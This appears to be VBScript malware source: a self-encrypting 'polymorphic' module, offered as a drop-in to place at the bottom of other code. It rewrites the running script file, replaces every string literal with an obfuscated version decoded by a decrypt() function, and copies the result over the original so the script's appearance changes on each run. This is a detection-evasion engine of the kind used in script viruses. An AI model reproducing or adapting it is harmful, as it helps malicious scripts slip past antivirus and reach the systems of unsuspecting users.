'Self crypting type P-II Psychologic
'Put it on the bottom of code
'Will encrypt strings every runz
'-------------------------------
set fso = createobject("scripting.filesystemobject")
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile("C:\poly",true)
do while mark <> "'marker"
  mark = op.readline
  for i = 1 to len(mark)
      c = mid(mark,i,1)
      if c = chr(34) then
          Call aaa
      else
          parser.write c
      end if
      if i = len(mark) then
      parser.write vbcrlf
      end if
  next
loop
sub aaa()
Counter = i
do while enc <> chr(34)
  Counter = Counter + 1
  enc = mid(mark,Counter,1)
  if enc = chr(34) then exit do
      If Asc(enc) Mod 2 = 0 Then
          enc1 = Chr(Asc(enc) + 1)
      else
          enc1 = Chr(Asc(enc) - 1)
      end if
  char = char & enc1
loop
all = "decrypt(" & chr(34) & char & chr(34) & ")"
parser.write all
i = Counter
end sub
op.close
parser.close
set back = fso.opentextfile("C:\poly",1)
reader = back.readall
set wrtall = fso.Createtextfile("C:\poly",true)
wrtall.write reader
Function decrypt(x)
  For i = 1 To Len(x)
      polya = Mid(x, i, 1)
      If Asc(polya) <> 34 And Asc(polya) <> 35 Then
          If Asc(polya) Mod 2 = 0 Then
              polya = Chr(Asc(polya) + 1)
          Else
              polya = Chr(Asc(polya) - 1)
          End If
      End If
  decrypt = decrypt & polya
  Next
End Function
fso.copyfile "C:\poly",wscript.scriptfullname
'marker
wrtall.writeline "Function decrypt(x)"
wrtall.writeline "For i = 1 To Len(x)"
wrtall.writeline "polya = Mid(x, i, 1)"
wrtall.writeline "If Asc(polya) <> 34 And Asc(polya) <> 35 Then"
wrtall.writeline "If Asc(polya) Mod 2 = 0 Then"
wrtall.writeline "polya = Chr(Asc(polya) + 1)"
wrtall.writeline "Else"
wrtall.writeline "polya = Chr(Asc(polya) - 1)"
wrtall.writeline "End If"
wrtall.writeline "End If"
wrtall.writeline "decrypt = decrypt & polya"
wrtall.writeline "Next"
wrtall.writeline "End Function"